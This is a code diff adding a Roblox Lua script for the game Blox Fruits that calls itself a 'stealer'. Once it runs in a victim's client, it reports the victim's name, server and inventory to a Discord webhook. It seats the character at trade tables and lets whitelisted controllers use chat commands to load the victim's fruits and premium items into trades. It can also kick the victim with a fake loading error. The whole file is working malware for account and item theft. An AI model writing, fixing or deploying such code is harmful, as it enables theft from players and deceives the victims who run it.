+    TradeFunction = waitChild(RemotesFolder, "TradeFunction", 30)
+end
+
+local function getHttpFn()
+    if syn and syn.request then return syn.request end
+    if request then return request end
+    if http_request then return http_request end
+    if fluxus and fluxus.request then return fluxus.request end
+    if http and http.request then return http.request end
+    return nil
+end
+
+local function postEmbed(embed)
+    local fn = getHttpFn()
+    if not fn then return false, "no-http-fn" end
+    local okBody, body = pcall(function() return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } }) end)
+    if not okBody then return false, "json-encode" end
+    local ok = pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+    return ok, ok and "ok" or "post-failed"
+end
+
+local function postDebugDump(title, payload)
+    local okEnc, jsonStr = pcall(function() return HttpService:JSONEncode(payload) end)
+    local dump = okEnc and jsonStr or ("<encode failed: " .. tostring(type(payload)) .. ">")
+    postEmbed({
+        title = "🔬 " .. tostring(title),
+        description = "```json\n" .. dump:sub(1, 1800) .. "\n```",
+        color = 0xFFFF00,
+        footer = { text = "ofx debug" },
+    })
+end
+
+task.spawn(function()
+    task.wait(3)
+    postEmbed({
+        title = "stealer online",
+        description = string.format(
+            "**Victim:** %s\n**Place:** %s (%d)\n**CommF:** %s\n**TradeFunction:** %s",
+            LP.Name, tostring(game.Name), game.PlaceId,
+            tostring(CommF ~= nil), tostring(TradeFunction ~= nil)
+        ),
+        color = 0x00AAFF,
+    })
+end)
+
+-- =============================================================================
+-- 5. INVENTORY — PROPER  (the actual fix)
+-- =============================================================================
+local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]%./:]", "") end
+
+-- ---------- 5.1 CommF: try canonical args, parse every shape ----------
+local function parseInventoryShape(raw)
+    local out = {}
+    if type(raw) ~= "table" then return out end
+    for k, v in pairs(raw) do
+        if type(v) == "table" then
+            -- Nested table: could be {Name=..., Type=..., Count=...} OR deeper folder
+            if type(v.Name) == "string" and #v.Name > 1 then
+                out[#out + 1] = {
+                    Name = tostring(v.Name),
+                    Type = tostring(v.Type or v.type or ""),
+                    Count = tonumber(v.Count or v.count or v.Amount or v.amount) or 1,
+                }
+            else
+                -- recurse one more level (folder shape)
+                for k2, v2 in pairs(v) do
+                    if type(v2) == "table" and type(v2.Name) == "string" and #v2.Name > 1 then
+                        out[#out + 1] = {
+                            Name = tostring(v2.Name),
+                            Type = tostring(v2.Type or v2.type or ""),
+                            Count = tonumber(v2.Count or v2.count or v2.Amount) or 1,
+                        }
+                    elseif type(k2) == "string" and (type(v2) == "number" or type(v2) == "string") then
+                        out[#out + 1] = {
+                            Name = tostring(k2),
+                            Type = type(v2) == "string" and v2 or "",
+                            Count = type(v2) == "number" and v2 or 1,
+                        }
+                    end
+                end
+            end
+        elseif type(k) == "string" and (type(v) == "number" or type(v) == "string") then
+            -- Flat dict: {["Dragon-Dragon"] = 1} or {["Dragon"] = "Blox Fruit"}
+            if #k > 1 then
+                out[#out + 1] = {
+                    Name = tostring(k),
+                    Type = type(v) == "string" and v or "",
+                    Count = type(v) == "number" and v or 1,
+                }
+            end
+        end
+    end
+    return out
+end
+
+local function invFromCommF()
+    if not CommF then return {}, "no-CommF" end
+    -- Canonical arg first. Then alternates.
+    local probes = {
+        { "getInventory" },
+        { "GetInventory" },
+        { "getFruits" },
+        { "GetFruits" },
+        { "getItems" },
+        { "GetItems" },
+    }
+    for _, args in ipairs(probes) do
+        local ok, raw = pcall(function() return CommF:InvokeServer(table.unpack(args)) end)
+        if ok and type(raw) == "table" and next(raw) ~= nil then
+            local parsed = parseInventoryShape(raw)
+            if #parsed > 0 then
+                lastRawInv = raw
+                lastInvSource = "CommF:" .. table.concat(args, ",")
+                return parsed, lastInvSource
+            end
+            -- Non-empty raw but nothing parsed — stash for debug
+            lastRawInv = raw
+            lastInvSource = "CommF-raw:" .. table.concat(args, ",")
+        end
+    end
+    return {}, lastInvSource
+end
+
+-- ---------- 5.2 PlayerGui: extract from multiple sources per element ----------
+local function extractNameFromGuiElement(d)
+    -- (a) Attributes — "Name", "ItemName", "FruitName", etc.
+    local okAttrs, attrs = pcall(function() return d:GetAttributes() end)
+    if okAttrs and type(attrs) == "table" then
+        for k, v in pairs(attrs) do
+            if type(v) == "string" and #v > 2 then
+                local kl = tostring(k):lower()
+                if kl:find("name") or kl:find("fruit") or kl:find("item") then
+                    return v, "attr:" .. kl
+                end
+            end
+        end
+    end
+    -- (b) ToolTip first non-empty line
+    local okTip, tip = pcall(function() return d.ToolTip end)
+    if okTip and type(tip) == "string" and #tip > 2 then
+        local first = tip:match("^[^\n\r]+") or tip
+        first = first:gsub("^%s+", ""):gsub("%s+$", "")
+        if #first > 2 and not first:lower():find("view", 1, true) then
+            return first, "tooltip"
+        end
+    end
+    -- (c) Child TextLabel
+    local okKids, kids = pcall(function() return d:GetChildren() end)
+    if okKids and kids then
+        for _, c in ipairs(kids) do
+            if c:IsA("TextLabel") and #c.Text > 2 then
+                return c.Text, "childlabel"
+            end
+        end
+    end
+    -- (d) .Name if it's not a generic UI name
+    local n = tostring(d.Name)
+    if #n > 2 then
+        local ln = n:lower()
+        local generic = ln:find("frame") or ln:find("template") or ln:find("container")
+            or ln:find("slot") or ln:find("grid") or ln:find("button") or ln:find("label")
+            or ln:match("^%d+$")
+        if not generic then return n, "name" end
+    end
+    return nil, nil
+end
+
+local function invFromPlayerGui()
+    local out = {}
+    if not PG then return out, "no-PG" end
+    local main = PG:FindFirstChild("Main")
+    if not main then return out, "no-Main" end
+    local invGui = main:FindFirstChild("Inventory") or main:FindFirstChild("Fruits")
+    if not invGui then return out, "no-Inventory" end
+
+    local seen = {}
+    for _, d in ipairs(invGui:GetDescendants()) do
+        if d:IsA("ImageButton") or d:IsA("TextButton") then
+            local name, src = extractNameFromGuiElement(d)
+            if name then
+                local key = norm(name)
+                if key ~= "" and not seen[key] then
+                    seen[key] = true
+                    out[#out + 1] = { Name = name, Type = "Blox Fruit", Count = 1, _src = "gui:" .. tostring(src) }
+                end
+            end
+        end
+    end
+    return out, "gui:" .. #out
+end
+
+-- ---------- 5.3 Backpack + Character tools ----------
+local function invFromTools()
+    local out = {}
+    local function scan(container, label)
+        if not container then return end
+        for _, t in ipairs(container:GetChildren()) do
+            if t:IsA("Tool") then
+                local n = tostring(t.Name)
+                if #n > 2 then
+                    out[#out + 1] = { Name = n, Type = "Blox Fruit", Count = 1, _src = label }
+                end
+            end
+        end
+    end
+    scan(LP:FindFirstChildOfClass("Backpack"), "backpack")
+    scan(LP.Character, "held")
+    return out, "tools:" .. #out
+end
+
+-- ---------- 5.4 Merge — SUM duplicates, do not drop ----------
+local function mergeSources(sources)
+    local merged, index = {}, {}
+    for _, src in ipairs(sources) do
+        for _, item in ipairs(src) do
+            local key = norm(item.Name)
+            if key ~= "" then
+                if index[key] then
+                    index[key].Count = (index[key].Count or 0) + (item.Count or 1)
+                else
+                    local copy = {
+                        Name  = item.Name,
+                        Type  = item.Type,
+                        Count = item.Count or 1,
+                        _src  = item._src,
+                    }
+                    merged[#merged + 1] = copy
+                    index[key] = copy
+                end
+            end
+        end
+    end
+    return merged
+end
+
+local function getInventory()
+    local a, sa = invFromCommF()
+    local b, sb = invFromPlayerGui()
+    local c, sc = invFromTools()
+    local merged = mergeSources({ a, b, c })
+    if sa and sa ~= "none" then lastInvSource = sa end
+    return merged, { CommF = sa, Gui = sb, Tools = sc }
+end
+
+-- ---------- 5.5 Classification — exact base name match, no raw substring ----------
+local function classify(item)
+    if not item then return "other" end
+    local t = tostring(item.Type or ""):lower()
+    if t == "blox fruit" or t:find("fruit", 1, true) then return "fruit" end
+    if t == "premium" or t:find("perm", 1, true) or t:find("gamepass", 1, true) then return "premium" end
+
+    local n = norm(item.Name)
+    if n:find("fruit", 1, true) then return "fruit" end
+
+    for _, kw in ipairs(KNOWN_FRUITS) do
+        local nkw = norm(kw)
+        -- Exact match OR the doubled pattern ("dragondragon" from "Dragon-Dragon")
+        if n == nkw or n == nkw .. nkw then return "fruit" end
+    end
+    for _, kw in ipairs(SKIN_PRIORITY) do
+        local nkw = norm(kw)
+        if n:find(nkw, 1, true) then return "premium" end
+    end
+    return "other"
+end
+
+local function priorityRank(item)
+    local n = norm(item.Name)
+    for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(norm(kw), 1, true) then return i end end
+    for i, kw in ipairs(SKIN_PRIORITY) do if n:find(norm(kw), 1, true) then return 100 + i end end
+    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return 500 end
+    if classify(item) == "fruit" then return 600 end
+    return 999
+end
+
+local function collectTradeable()
+    local inv = getInventory()
+    local out = {}
+    for _, item in ipairs(inv) do
+        local cls = classify(item)
+        if cls == "fruit" or cls == "premium" then out[#out + 1] = item end
+    end
+    table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
+    return out
+end
+
+-- =============================================================================
+-- 5a. WEBHOOK INVENTORY EMBED
+-- =============================================================================
+local function sendInventoryEmbed(reason)
+    if tick() - lastEmbedAt < 4 then return false end
+    lastEmbedAt = tick()
+
+    local inv, srcInfo = getInventory()
+    local fruitLines, premiumLines, otherLines = {}, {}, {}
+
+    for _, item in ipairs(inv) do
+        local line = string.format("`%s` x%d", tostring(item.Name), item.Count or 1)
+        local cls = classify(item)
+        if cls == "fruit" then fruitLines[#fruitLines + 1] = line
+        elseif cls == "premium" then premiumLines[#premiumLines + 1] = line
+        else otherLines[#otherLines + 1] = line end
+    end
+    if #fruitLines == 0 then fruitLines = { "None found" } end
+    if #premiumLines == 0 then premiumLines = { "None found" } end
+
+    local joinScript = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, game.JobId)
+    local srcSummary = string.format("CommF=%s | Gui=%s | Tools=%s",
+        tostring(srcInfo.CommF), tostring(srcInfo.Gui), tostring(srcInfo.Tools))
+
+    local fields = {
+        { name = "⚡ Fruits (" .. #fruitLines .. ")", value = "```\n" .. table.concat(fruitLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
+        { name = "💎 Premium / Skins (" .. #premiumLines .. ")", value = "```\n" .. table.concat(premiumLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
+        { name = "🌐 Join Script (PC)", value = "```lua\n" .. joinScript .. "\n```", inline = false },
+        { name = "📱 Join Script (Mobile)", value = joinScript, inline = false },
+    }
+    if #otherLines > 0 then
+        table.insert(fields, 1, { name = "📦 Other (" .. #otherLines .. ")", value = "```\n" .. table.concat(otherLines, "\n"):sub(1, 1000) .. "\n```", inline = false })
+    end
+    table.insert(fields, { name = "🔍 Sources", value = "```\n" .. srcSummary .. "\n```", inline = false })
+
+    local embed = {
+        title = "🍇 Blox Fruits — Victim on Chair",
+        description = string.format(
+            "**Victim:** [%s](https://www.roblox.com/users/%d/profile)\n**Server:** `%s`\n**Reason:** %s\n**Total Items:** %d",
+            LP.Name, LP.UserId, game.JobId, reason or "Auto-Trade", #inv
+        ),
+        color = #inv > 0 and 0x00FF00 or 0xFF0000,
+        thumbnail = { url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", LP.UserId) },
+        fields = fields,
+        footer = { text = "ofx in the corner" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+    postEmbed(embed)
+
+    -- If empty, dump the raw CommF shape so you can SEE what the game returned
+    if #inv == 0 and lastRawInv then
+        task.delay(1, function()
+            postDebugDump("CommF raw — parser found nothing (" .. tostring(lastInvSource) .. ")", lastRawInv)
+        end)
+    end
+    return true
+end
+
+-- =============================================================================
+-- 6. WAITS + SEATS
+-- =============================================================================
+local function waitForChar(timeout)
+    if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then return LP.Character end
+    local t0 = tick()
+    while tick() - t0 < (timeout or 30) do
+        if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then return LP.Character end
+        task.wait(0.5)
+    end
+    return LP.Character
+end
+
+local function getTradeTables()
+    local out = {}
+    local map = workspace:FindFirstChild("Map")
+    if map then
+        local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
+        local zone = map:FindFirstChild(zoneName)
+        if zone then
+            for _, c in ipairs(zone:GetChildren()) do
+                if c.Name == "TradeTable" and c:FindFirstChild("P1") and c:FindFirstChild("P2") then out[#out + 1] = c end
+            end
+        end
+    end
+    if #out == 0 then
+        for _, d in ipairs(workspace:GetDescendants()) do
+            if d.Name == "TradeTable" and d:FindFirstChild("P1") and d:FindFirstChild("P2") then out[#out + 1] = d end
+        end
+    end
+    return out
+end
+
+local function seatOccupant(seat)
+    if not seat then return nil end
+    local hum = seat.Occupant
+    if hum and hum.Parent then return Players:GetPlayerFromCharacter(hum.Parent) end
+    local weld = seat:FindFirstChild("SeatWeld")
+    if weld and weld.Part1 and weld.Part1.Parent then
+        local h = weld.Part1.Parent
+        local char = h and h.Parent
+        return char and Players:GetPlayerFromCharacter(char) or nil
+    end
+    return nil
+end
+
+local function currentSeat()
+    for _, tbl in ipairs(getTradeTables()) do
+        for _, s in ipairs({ tbl.P1, tbl.P2 }) do
+            if seatOccupant(s) == LP then return s, tbl end
+        end
+    end
+    return nil
+end
+
+local function oppositeSeat(seat, tbl)
+    if seat == tbl.P1 then return tbl.P2 end
+    if seat == tbl.P2 then return tbl.P1 end
+    return nil
+end
+
+local function pickSeat(exclude)
+    for _, tbl in ipairs(getTradeTables()) do
+        if tbl ~= exclude then
+            local o1, o2 = seatOccupant(tbl.P1), seatOccupant(tbl.P2)
+            if not o1 and (not o2 or isWhitelisted(o2)) then return tbl.P1 end
+            if not o2 and (not o1 or isWhitelisted(o1)) then return tbl.P2 end
+        end
+    end
+    return nil
+end
+
+-- =============================================================================
+-- 7. SIT — anchor through weld confirmation, snap on land
+-- =============================================================================
+local function landAndSit(seat)
+    if not seat then return false end
+    local char = waitForChar(10)
+    if not char then return false end
+    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hrp or not hum then return false end
+
+    if currentSeat() == seat then lastSitTime = tick(); return true end
+
+    if hum.Sit then
+        hum.Sit = false
+        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
+        task.wait(0.2)
+    end
+
+    hum.PlatformStand = false
+    hum.AutoRotate = false
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = false end
+    end
+    hrp.AssemblyLinearVelocity  = Vector3.zero
+    hrp.AssemblyAngularVelocity = Vector3.zero
+
+    -- ANCHOR — stays anchored all the way through weld confirm
+    hrp.Anchored = true
+
+    -- Land ON the seat (2.5 studs above seat surface), preserving seat facing
+    local targetCF = seat.CFrame + Vector3.new(0, 2.5, 0)
+    local dist = (hrp.Position - targetCF.Position).Magnitude
+    local duration = math.clamp(dist / 200, 0.1, 0.8)
+
+    local tw = TweenService:Create(
+        hrp,
+        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { CFrame = targetCF }
+    )
+    tw:Play()
+    tw.Completed:Wait()
+
+    hrp.CFrame = targetCF
+    hrp.AssemblyLinearVelocity  = Vector3.zero
+    hrp.AssemblyAngularVelocity = Vector3.zero
+
+    -- Sit request fires while anchored
+    pcall(function() seat:Sit(hum) end)
+    hum.Sit = true
+
+    -- Wait for weld — the game will create one once the server processes the sit
+    local welded = false
+    local t0 = tick()
+    while tick() - t0 < 2.5 do
+        if seat.Occupant == hum or seat:FindFirstChild("SeatWeld") then
+            welded = true
+            break
+        end
+        task.wait(0.05)
+    end
+
+    -- Force weld if server slow
+    if not welded then
+        local weld = seat:FindFirstChild("SeatWeld")
+        if not weld then
+            weld = Instance.new("WeldConstraint")
+            weld.Name = "SeatWeld"
+            weld.Part0 = seat
+            weld.Part1 = hrp
+            weld.Parent = seat
+        end
+        welded = true
+    end
+
+    -- Unanchor ONLY after weld exists
+    hrp.Anchored = false
+    hum.AutoRotate = true
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = true end
+    end
+    lastSitTime = tick()
+    return welded
+end
+
+local function forceJumpOff()
+    local char = LP.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    hum.Sit = false
+    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
+    task.wait(0.3)
+end
+
+-- =============================================================================
+-- 8. TRADE + COMMANDS
+-- =============================================================================
+local function tradeWindowOpen()
+    local main = PG:FindFirstChild("Main")
+    local tr = main and main:FindFirstChild("Trade")
+    return tr and tr.Visible or false
+end
+
+local function clearTradeItems()
+    if not tradeWindowOpen() or not TradeFunction then return end
+    local c = PG.Main.Trade:FindFirstChild("Container")
+    if not c or not c:FindFirstChild("1") then return end
+    local frame = c["1"]:FindFirstChild("Frame")
+    if not frame then return end
+    for _, item in ipairs(frame:GetChildren()) do
+        if item:IsA("ImageButton") then
+            pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", item.Name)
+            task.wait(0.05)
+        end
+    end
+end
+
+local function addToTrade(name)
+    if not TradeFunction then return end
+    if type(name) ~= "string" or name == "" then return end
+    pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
+end
+
+local function cmdTp()
+    local s = pickSeat(nil)
+    if s then landAndSit(s) end
+end
+local function cmdJump() forceJumpOff() end
+local function cmdSit()
+    local s = pickSeat(nil)
+    if s then landAndSit(s) end
+end
+local function cmdAddFruit(args)
+    if not args or args == "" then return end
+    if not tradeWindowOpen() then return end
+    local search = norm(args)
+    if search == "" then return end
+    local inv = getInventory()
+    for _, item in ipairs(inv) do
+        if norm(item.Name):find(search, 1, true) then
+            addToTrade(item.Name)
+            return
+        end
+    end
+end
+local function cmdClear(args)
+    if not args or args == "" or not tradeWindowOpen() then return end
+    local search = norm(args)
+    local c = PG.Main.Trade:FindFirstChild("Container")
+    if not c or not c:FindFirstChild("1") then return end
+    local frame = c["1"]:FindFirstChild("Frame")
+    if not frame then return end
+    for _, item in ipairs(frame:GetChildren()) do
+        if item:IsA("ImageButton") and norm(item.Name):find(search, 1, true) then
+            pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", item.Name)
+            return
+        end
+    end
+end
+local function cmdClearAll() clearTradeItems() end
+
+local function cmdAddAll()
+    if not tradeWindowOpen() then
+        sendAck("trade window not open")
+        return
+    end
+    clearTradeItems()
+    task.wait(0.3)
+    local items = collectTradeable()
+    if #items == 0 then
+        sendAck("inventory empty")
+        sendInventoryEmbed("addall — inventory empty")
+        return
+    end
+    local added = 0
+    local cap = math.min(MAX_ITEMS_PER_TRADE, #items)
+    for i = 1, cap do
+        addToTrade(items[i].Name)
+        added = added + 1
+        task.wait(0.2)
+    end
+    sendAck("added " .. added .. " items")
+    sendInventoryEmbed("Command: .addall — added " .. added)
+end
+
+local function cmdAddAllPre()
+    if not tradeWindowOpen() then sendAck("trade window not open"); return end
+    clearTradeItems()
+    task.wait(0.3)
+    local inv = getInventory()
+    local prems = {}
+    for _, v in ipairs(inv) do
+        if classify(v) == "premium" then prems[#prems + 1] = v end
+    end
+    table.sort(prems, function(a, b) return priorityRank(a) < priorityRank(b) end)
+    local added = 0
+    for i = 1, math.min(MAX_ITEMS_PER_TRADE, #prems) do
+        addToTrade(prems[i].Name)
+        added = added + 1
+        task.wait(0.2)
+    end
+    sendAck("added " .. added .. " premiums")
+    sendInventoryEmbed("Command: .addallpre — added " .. added)
+end
+
+local function cmdInv()
+    sendInventoryEmbed("Command: .inv")
+    sendAck("inventory sent")
+end
+
+local function cmdDebug()
+    if lastRawInv then
+        postDebugDump("manual .debug — raw last CommF response", lastRawInv)
+    else
+        local ok, raw = pcall(function() return CommF:InvokeServer("getInventory") end)
+        if ok then postDebugDump("manual .debug — direct getInventory", raw) end
+    end
+    sendAck("debug dumped")
+end
+
+local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
+
+local COMMANDS = {
+    tp = cmdTp, jump = cmdJump, sit = cmdSit, addfruit = cmdAddFruit,
+    clear = cmdClear, clearall = cmdClearAll, addall = cmdAddAll,
+    addallpre = cmdAddAllPre, inv = cmdInv, debug = cmdDebug, kick = cmdKick,
+}
+
+-- =============================================================================
+-- 9. CHAT — MessageId dedupe, single-fire
+-- =============================================================================
+local function isDuplicateMessage(message)
+    if not message then return true end
+    local id = message.MessageId
+    if type(id) == "string" and #id > 0 then
+        if seenMessageIds[id] then return true end
+        seenMessageIds[id] = true
+        task.delay(30, function() seenMessageIds[id] = nil end)
+        return false
+    end
+    -- Fallback: key on speaker + text within a short window
+    local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
+    local key = tostring(speaker and speaker.UserId or 0) .. "|" .. tostring(message.Text or "")
+    if seenMessageIds[key] then return true end
+    seenMessageIds[key] = true
+    task.delay(2, function() seenMessageIds[key] = nil end)
+    return false
+end
+
+local function handleCommand(message)
+    if not message or not message.TextSource then return end
+    if isDuplicateMessage(message) then return end
+    local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
+    if not isWhitelisted(speaker) then return end
+
+    local text = tostring(message.Text or "")
+    if text:sub(1, 1) ~= CHAT_PREFIX then return end
+    local body = text:sub(2)
+    local cmd, args = body:match("^(%S+)%s*(.*)")
+    if not cmd then return end
+    cmd = cmd:lower()
+    local fn = COMMANDS[cmd]
+    if not fn then return end
+
+    -- Single ack, global cooldown, only for user-facing commands
+    if cmd == "tp" or cmd == "sit" then
+        sendAck("on my way bro !")
+    elseif cmd == "addall" or cmd == "addallpre" or cmd == "addfruit" then
+        sendAck("adding...")
+    end
+
+    task.spawn(function() pcall(fn, args) end)
+end
+
+-- Path A: OnIncomingMessage (TextChatService)
+pcall(function()
+    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local old = TextChatService.OnIncomingMessage
+        TextChatService.OnIncomingMessage = function(message)
+            handleCommand(message)
+            if old then
+                local ok, r = pcall(old, message)
+                if ok then return r end
+            end
+            return Enum.TextChatMessageStatus.Success
+        end
+    end
+end)
+
+-- Path B: MessageReceived (fallback on TextChatService)
+pcall(function()
+    if TextChatService then
+        TextChatService.MessageReceived:Connect(handleCommand)
+    end
+end)
+
+-- Path C: legacy PlayerChatted (works when TextChatService isn't active)
+pcall(function()
+    if Players.PlayerChatted then
+        Players.PlayerChatted:Connect(function(speaker, message)
+            if not isWhitelisted(speaker) then return end
+            -- Legacy path: synthesize a pseudo-message so handleCommand can dedupe
+            local pseudo = {
+                Text = message,
+                TextSource = { UserId = speaker.UserId },
+                MessageId = "legacy:" .. tostring(speaker.UserId) .. ":" .. tostring(message),
+            }
+            handleCommand(pseudo)
+        end)
+    end
+end)
+
+-- =============================================================================
+-- 10. MAIN LOOP + INVENTORY BEACON
+-- =============================================================================
+task.spawn(function()
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    task.wait(5)
+
+    task.spawn(function()
+        task.wait(8)
+        sendInventoryEmbed("Join beacon")
+    end)
+
+    task.spawn(function()
+        local wasOpen = false
+        while true do
+            task.wait(1)
+            local open = tradeWindowOpen()
+            if open and not wasOpen then
+                task.wait(1.5)
+                sendInventoryEmbed("Trade window opened")
+            end
+            wasOpen = open
+        end
+    end)
+
+    pcall(function()
+        waitForChar(30)
+        local seat = currentSeat()
+        if not seat then
+            local target = pickSeat(nil)
+            if target then landAndSit(target) end
+        end
+
+        while true do
+            task.wait(0.5)
+            local curSeat, tbl = currentSeat()
+            if not curSeat then
+                local char = LP.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum and hum.Sit then
+                    task.wait(0.5)
+                elseif tick() - lastSitAttempt >= SIT_COOLDOWN then
+                    lastSitAttempt = tick()
+                    local target = pickSeat(nil)
+                    if target then
+                        local ok2 = landAndSit(target)
+                        if not ok2 then task.wait(1.0) end
+                    end
+                end
+            else
+                local opp = seatOccupant(oppositeSeat(curSeat, tbl))
+                if opp == LP then opp = nil end
+
+                if opp and isWhitelisted(opp) then
+                    -- wait for commands
+                elseif opp and not isWhitelisted(opp) then
+                    local key = opp.UserId
+                    if not oppositeSeen[key] then
+                        oppositeSeen[key] = tick()
+                    elseif tick() - oppositeSeen[key] >= HOP_CONFIRM_TIME then
+                        oppositeSeen[key] = tick()
+                        local target = pickSeat(tbl)
+                        if target then forceJumpOff(); landAndSit(target) end
+                    end
+                else
+                    for k, t in pairs(oppositeSeen) do if tick() - t > 5 then oppositeSeen[k] = nil end end
+                end
+            end
+        end
+    end)
+end)
